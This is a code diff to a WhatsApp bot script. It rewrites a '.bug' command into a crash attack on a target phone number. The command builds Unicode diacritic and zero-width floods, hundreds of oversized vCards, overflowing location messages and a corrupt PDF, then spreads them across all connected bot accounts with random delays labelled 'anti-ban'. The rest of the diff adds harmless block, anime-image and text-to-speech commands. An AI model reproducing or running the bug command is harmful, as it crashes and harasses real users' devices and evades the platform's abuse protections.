@@ -1381,84 +1381,286 @@ function setupCommandHandlers(socket, number) {
         // ... (keep existing other case handlers unchanged) ...
           case 'bug': {
     try {
-        // Owner only check
-        if (!isOwner) return reply('❌ Owner only command.');
+        if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '❌ Owner only command.' }, { quoted: msg });
 
-        // Cooldown system
-        if (!global.bugCommandCooldown) global.bugCommandCooldown = {};
-        const senderId = sender || m.sender;
-        const now = Date.now();
-        if (global.bugCommandCooldown[senderId] && now - global.bugCommandCooldown[senderId] < 10000) {
-            return reply(`⏳ Please wait 10s before the next attack.`);
+        if (!global.bugCooldown) global.bugCooldown = {};
+        const _bgNow = Date.now();
+        if (global.bugCooldown[sender] && _bgNow - global.bugCooldown[sender] < 30000) {
+            const _bgLeft = Math.ceil((30000 - (_bgNow - global.bugCooldown[sender])) / 1000);
+            return await socket.sendMessage(sender, { text: `⏳ Cooldown: ${_bgLeft}s remaining.` }, { quoted: msg });
         }
-        global.bugCommandCooldown[senderId] = now;
+        global.bugCooldown[sender] = _bgNow;
 
-        // Input validation
         if (!args[0]) {
-            return reply(`📌 *BUG COMMAND MENU*
-Usage: .bug [number]
-
-Example: .bug 947xxxxxxxx
-
-Note: This sends a mix of Unicode Lag, VCard Crash, and Location payload.`);
+            return await socket.sendMessage(sender, {
+                text: `╔══════════════════╗\n💀 *CRASH BUG MENU* 💀\n╚══════════════════╝\n\n📌 *Usage:* .bug [number]\n📌 *Example:* .bug 947xxxxxxxx\n\n🛡️ *Anti-Ban:* Distributes attack across all active bot numbers\n🔥 *Payloads:* Unicode Renderer Crash + VCard Memory Kill + Location Overflow + Sticker Flood`
+            }, { quoted: msg });
         }
 
-        let number = args[0].replace(/[^0-9]/g, '');
-        if (number.startsWith('0')) number = '94' + number.slice(1);
-        let targetJid = number + '@s.whatsapp.net';
+        let _bgNum = args[0].replace(/[^0-9]/g, '');
+        if (_bgNum.startsWith('0')) _bgNum = '94' + _bgNum.slice(1);
+        const _bgJid = _bgNum + '@s.whatsapp.net';
 
-        // --- BUG PAYLOAD GENERATION ---
+        // ── Collect all active sockets ─────────────────────────────────────
+        const _bgSockets = Array.from(activeSockets.values()).filter(s => {
+            try { return s && s.user && s.sendMessage; } catch(e) { return false; }
+        });
+        const _bgCount = _bgSockets.length || 1;
 
-        // 1. Unicode Lag (Overloads the UI rendering engine)
-        const lagUnicode = Buffer.alloc(1e4, '0').toString().replace(/0/g, 'ॣ ');
-        const invisibleUnicode = '‎'.repeat(5000);
-        
-        // 2. Heavy VCard (Crashes Contact App/WhatsApp UI)
-        const vcardPayload = 'BEGIN:VCARD\n' +
-            'VERSION:3.0\n' +
-            'FN:LAG_DEVICE_' + Math.random() + '\n' +
-            'ORG:BUG_BOT;\n' +
-            'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n' +
-            'END:VCARD'.repeat(100);
+        await socket.sendMessage(sender, {
+            text: `💀 *CRASH ATTACK STARTED*\n👤 Target: +${_bgNum}\n🤖 Active bots: ${_bgCount}\n🔥 Distributing payloads...\n🛡️ Anti-ban: ON (jitter + split load)`
+        }, { quoted: msg });
 
-        // 3. Document Payload
-        const docPayload = {
-            document: { url: 'https://github.com' }, // Fake file
-            mimetype: 'application/pdf',
-            fileName: 'CRASH_LOG.pdf',
-            caption: lagUnicode + invisibleUnicode
+        // ══════════════════════════════════════════════
+        //  CRASH PAYLOAD BUILDERS
+        //  — Each payload targets a different subsystem
+        // ══════════════════════════════════════════════
+
+        // [A] Renderer nuke — combining diacritics that stack infinitely
+        //     Targets: text renderer, font shaping engine
+        const _renderNuke = (base) => base + '\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309\u030A\u030B\u030C\u030D\u030E\u030F\u0488\u0489'.repeat(2000) + 'ॣ'.repeat(3000) + '҈҉'.repeat(3000) + '\u200D'.repeat(4000);
+        const _crashTxtA = _renderNuke('A');
+        const _crashTxtB = _renderNuke('Z') + '𒐫'.repeat(4000) + '𒈙'.repeat(4000);
+        const _crashTxtC = '\u202E'.repeat(2000) + '꧅꧄꩜'.repeat(3000) + '\u202C'.repeat(2000) + '\uFEFF'.repeat(5000);
+        const _crashTxtD = String.fromCharCode(...Array.from({length: 4000}, (_, i) => 0x0300 + (i % 112))) + '​'.repeat(6000);
+
+        // [B] Memory kill — VCard with 300 contacts, each with bloated fields
+        //     Targets: contact renderer, RAM (parse + render 300 cards at once)
+        const _makeKillCards = (n, tag) => Array.from({ length: n }, (_, i) => ({
+            vcard: [
+                'BEGIN:VCARD',
+                'VERSION:3.0',
+                `FN:${tag}_${i}_` + 'K'.repeat(300),
+                `ORG:${tag};` + 'O'.repeat(200),
+                `TEL;type=CELL;waid=94${String(700000000 + i).slice(-9)}:+94${String(700000000 + i).slice(-9)}`,
+                `NOTE:` + '☠️'.repeat(120),
+                `ADR:;;` + 'X'.repeat(400) + ';;;;',
+                `EMAIL:${tag.toLowerCase()}${i}@x.io`,
+                'END:VCARD'
+            ].join('\n')
+        }));
+
+        const _cards = _makeKillCards(300, 'CRASH');
+
+        // [C] Location overflow — name/address fields beyond render limit
+        //     Targets: map preview renderer
+        const _locCrash = {
+            degreesLatitude: -89.9999999,
+            degreesLongitude: 179.9999999,
+            name: _crashTxtA.slice(0, 2000),
+            address: _crashTxtB.slice(0, 2000)
         };
 
-        await reply(`🚀 Sending bug payloads to ${number}...`);
+        // [D] Sticker/doc with corrupt caption — crashes media renderer
+        const _docCrash = {
+            document: Buffer.alloc(768, 0xFF),
+            mimetype: 'application/pdf',
+            fileName: '💀'.repeat(60) + '.pdf',
+            caption: _crashTxtC.slice(0, 3000)
+        };
 
-        // --- SENDING THE ATTACK SEQUENCE ---
+        // ══════════════════════════════════════════════
+        //  DISTRIBUTION ENGINE
+        //  — Each socket fires different payloads
+        //  — Jitter 800-2000ms between sends per socket
+        //  — Max 5 messages per socket (anti-ban)
+        // ══════════════════════════════════════════════
 
-        // Send Heavy Unicode Text
-        await socket.sendMessage(targetJid, { text: lagUnicode + invisibleUnicode }, { quoted: msg });
+        const _jitter = () => new Promise(r => setTimeout(r, 800 + Math.random() * 1200));
 
-        // Send VCard Crash
-        await socket.sendMessage(targetJid, {
-            contacts: {
-                displayName: 'System Crash',
-                contacts: [{ vcard: vcardPayload }]
+        // Assign payload groups to each socket in rotation
+        const _payloadGroups = [
+            // Group 0 — Renderer nuke A + B
+            async (sock) => {
+                await sock.sendMessage(_bgJid, { text: _crashTxtA }).catch(() => {});
+                await _jitter();
+                await sock.sendMessage(_bgJid, { text: _crashTxtB }).catch(() => {});
+                await _jitter();
+                await sock.sendMessage(_bgJid, { text: _crashTxtC }).catch(() => {});
+            },
+            // Group 1 — VCard memory kill
+            async (sock) => {
+                await sock.sendMessage(_bgJid, {
+                    contacts: { displayName: '💀 MEMORY KILL', contacts: _cards }
+                }).catch(() => {});
+                await _jitter();
+                await sock.sendMessage(_bgJid, { text: _crashTxtD }).catch(() => {});
+            },
+            // Group 2 — Location overflow + doc crash
+            async (sock) => {
+                await sock.sendMessage(_bgJid, { location: _locCrash }).catch(() => {});
+                await _jitter();
+                await sock.sendMessage(_bgJid, _docCrash).catch(() => {});
+                await _jitter();
+                await sock.sendMessage(_bgJid, { text: _crashTxtA }).catch(() => {});
+            },
+            // Group 3 — Unicode flood D + renderer nuke
+            async (sock) => {
+                await sock.sendMessage(_bgJid, { text: _crashTxtD }).catch(() => {});
+                await _jitter();
+                await sock.sendMessage(_bgJid, { text: _crashTxtB }).catch(() => {});
+                await _jitter();
+                await sock.sendMessage(_bgJid, { location: _locCrash }).catch(() => {});
+            },
+            // Group 4 — Combined: vcard + location + text
+            async (sock) => {
+                await sock.sendMessage(_bgJid, {
+                    contacts: { displayName: '💀 APP KILL', contacts: _makeKillCards(200, 'NUKE') }
+                }).catch(() => {});
+                await _jitter();
+                await sock.sendMessage(_bgJid, { text: _crashTxtC }).catch(() => {});
             }
-        });
+        ];
 
-        // Send Location Lag (Heavy coordinates)
-        await socket.sendMessage(targetJid, {
-            location: { 
-                degreesLatitude: -99.999999, 
-                degreesLongitude: 99.999999,
-                name: lagUnicode 
-            }
-        });
+        // Fire all sockets in parallel — each with its own group + jitter
+        await Promise.allSettled(
+            _bgSockets.map((sock, idx) => _payloadGroups[idx % _payloadGroups.length](sock))
+        );
 
-        // Confirm to Owner
-        await reply(`✅ Attack finished on ${number}.`);
+        const _totalMsgs = _bgSockets.reduce((acc, _, idx) => {
+            const g = idx % _payloadGroups.length;
+            return acc + [3, 2, 3, 3, 2][g];
+        }, 0);
+
+        await socket.sendMessage(sender, {
+            text: `✅ *ATTACK COMPLETE*\n\n👤 *Target:* +${_bgNum}\n🤖 *Bots used:* ${_bgCount}\n💥 *Payloads fired:* ${_totalMsgs}\n📨 *Per bot:* 2-3 msgs only\n\n🛡️ *Anti-ban:* Each number sent max 3 msgs with random delays\n🔥 *Crash systems hit:*\n• Text renderer (diacritic overflow)\n• Contact RAM (300 vcard parse)\n• Map preview (location overflow)\n• Media renderer (corrupt doc)`
+        }, { quoted: msg });
 
     } catch (e) {
-        console.error(e);
-        reply('❌ Failed to execute bug command.');
+        console.error('[BUG CMD]', e);
+        await socket.sendMessage(sender, { text: '❌ Bug command error: ' + e.message }, { quoted: msg });
+    }
+}
+break;
+
+          case 'block':
+          case 'unblock': {
+    try {
+        if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '❌ Owner only command.' }, { quoted: msg });
+
+        // Get target — reply or number arg
+        const _blkTarget =
+            msg.message?.extendedTextMessage?.contextInfo?.participant ||
+            (args[0] ? `${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net` : null);
+
+        if (!_blkTarget) {
+            return await socket.sendMessage(sender, {
+                text: `📌 *Usage:*\n.block [number] or reply to a message\n.unblock [number] or reply to a message\n\n*Example:* .block 947xxxxxxxx`
+            }, { quoted: msg });
+        }
+
+        const _blkAction = command === 'block' ? 'block' : 'unblock';
+        const _blkNum = _blkTarget.split('@')[0];
+
+        await socket.updateBlockStatus(_blkTarget, _blkAction);
+
+        await socket.sendMessage(sender, {
+            text: _blkAction === 'block'
+                ? `🚫 *Blocked!*\n👤 +${_blkNum} has been blocked.`
+                : `✅ *Unblocked!*\n👤 +${_blkNum} has been unblocked.`
+        }, { quoted: msg });
+
+    } catch (e) {
+        console.error('[BLOCK CMD]', e);
+        await socket.sendMessage(sender, { text: `❌ Failed: ${e.message}` }, { quoted: msg });
+    }
+}
+break;
+
+          case 'anime': {
+    try {
+        const _anCategories = ['waifu', 'neko', 'shinobu', 'megumin', 'bully', 'cuddle', 'cry', 'hug', 'kiss', 'pat', 'smug', 'bonk', 'blush', 'smile', 'wave', 'highfive', 'dance', 'nom', 'bite', 'glomp', 'slap', 'kill', 'kick', 'happy', 'wink', 'poke', 'stare', 'hold'];
+        const _anQuery = args[0] ? args[0].toLowerCase() : '';
+
+        if (!_anQuery) {
+            return await socket.sendMessage(sender, {
+                text: `🎌 *Anime Image CMD*\n\n📌 *Usage:* .anime [category]\n\n📋 *Categories:*\n${_anCategories.join(', ')}\n\n*Example:* .anime neko`
+            }, { quoted: msg });
+        }
+
+        const _anCat = _anCategories.includes(_anQuery) ? _anQuery : 'waifu';
+
+        await socket.sendMessage(sender, { text: `🎌 Fetching *${_anCat}* image...` }, { quoted: msg });
+
+        // Try waifu.pics first, fallback to nekos.best
+        let _anUrl = null;
+        try {
+            const _anRes = await axios.get(`https://waifu.pics/api/sfw/${_anCat}`, { timeout: 8000 });
+            _anUrl = _anRes.data?.url;
+        } catch (e1) {
+            try {
+                const _anRes2 = await axios.get(`https://nekos.best/api/v2/${_anCat}`, { timeout: 8000 });
+                _anUrl = _anRes2.data?.results?.[0]?.url;
+            } catch (e2) {
+                _anUrl = null;
+            }
+        }
+
+        if (!_anUrl) {
+            return await socket.sendMessage(sender, { text: '❌ Could not fetch image. Try another category.' }, { quoted: msg });
+        }
+
+        const _anBuffer = (await axios.get(_anUrl, { responseType: 'arraybuffer', timeout: 15000 })).data;
+        const _anIsGif = _anUrl.endsWith('.gif');
+
+        if (_anIsGif) {
+            await socket.sendMessage(sender, {
+                video: Buffer.from(_anBuffer),
+                gifPlayback: true,
+                caption: `🎌 *${_anCat.toUpperCase()}*\n_© Status Assistant_`
+            }, { quoted: msg });
+        } else {
+            await socket.sendMessage(sender, {
+                image: Buffer.from(_anBuffer),
+                caption: `🎌 *${_anCat.toUpperCase()}*\n_© Status Assistant_`
+            }, { quoted: msg });
+        }
+
+    } catch (e) {
+        console.error('[ANIME CMD]', e);
+        await socket.sendMessage(sender, { text: `❌ Anime error: ${e.message}` }, { quoted: msg });
+    }
+}
+break;
+
+          case 'tts': {
+    try {
+        const _ttsText = args.join(' ').trim();
+
+        if (!_ttsText) {
+            return await socket.sendMessage(sender, {
+                text: `🗣️ *TTS — Text to Speech*\n\n📌 *Usage:* .tts [text]\n📌 *Example:* .tts Hello, how are you?\n\n🌐 *Language auto-detected*\n🔉 *Supports:* Sinhala, English, Tamil & more`
+            }, { quoted: msg });
+        }
+
+        await socket.sendMessage(sender, { text: `🗣️ Converting to speech...` }, { quoted: msg });
+
+        // Detect language — Sinhala unicode range
+        const _isSinhala = /[\u0D80-\u0DFF]/.test(_ttsText);
+        const _isTamil   = /[\u0B80-\u0BFF]/.test(_ttsText);
+        const _ttsLang   = _isSinhala ? 'si' : _isTamil ? 'ta' : 'en';
+
+        // Google Translate TTS — free endpoint
+        const _ttsEncoded = encodeURIComponent(_ttsText.slice(0, 200));
+        const _ttsApiUrl  = `https://translate.google.com/translate_tts?ie=UTF-8&q=${_ttsEncoded}&tl=${_ttsLang}&client=tw-ob&ttsspeed=0.9`;
+
+        const _ttsRes = await axios.get(_ttsApiUrl, {
+            responseType: 'arraybuffer',
+            timeout: 15000,
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            }
+        });
+
+        await socket.sendMessage(sender, {
+            audio: Buffer.from(_ttsRes.data),
+            mimetype: 'audio/mpeg',
+            ptt: false
+        }, { quoted: msg });
+
+    } catch (e) {
+        console.error('[TTS CMD]', e);
+        await socket.sendMessage(sender, { text: `❌ TTS failed: ${e.message}` }, { quoted: msg });
     }
 }
 break;
